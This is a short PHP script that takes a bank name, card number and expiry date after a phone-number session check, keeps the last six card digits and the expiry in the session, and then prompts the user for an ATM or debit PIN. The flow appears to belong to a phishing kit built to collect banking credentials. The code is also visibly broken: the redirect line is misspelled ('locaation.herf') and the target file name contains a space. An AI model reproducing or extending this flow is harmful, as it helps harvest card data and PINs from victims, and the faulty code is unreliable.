<?php
session_start();
require_once 'connect.php';

//get user details from session
$country_code = $_SESSION['country_code'] ?? '';
$phone_number = $_SESSION['phone_number'] ?? '';

//verfiy user is logged in
if (empty($country_code) || empty($phone_number)) {
    echo "<script>alert('Please log in to access this page.'); window.location.href = 'login.php';</script>";
    exit;
}

//get from data 
$bank_name =$_POST['bank_name'] ?? '';
$card_number =$_POST['card_number'] ?? '';
$expiry_date =$_POST['expiry_date'] ?? '';

//vaildation 
if (empty($bank_name) || empty($card_number) || empty($expiry_date)) {
    echo "<script>alert('please fill all fields .'); window.history.back();</script>";
    exit;
}

//extract last 6 digits for security
$last_six = substr($card_number, -6);

//store in session for next step 
$_SESSION['bank_name'] = $bank_name;
$_SESSION['card_number'] = $last_six;
$_SESSION['expiry_date'] = $expiry_date;

//redirect to ATM or debit  pin page
echo "<script>
alert('card details saved. please enter your ATM or debit  pin.');
window.locaation.herf = 'debit_atm _pin.html';
</script>";
?>
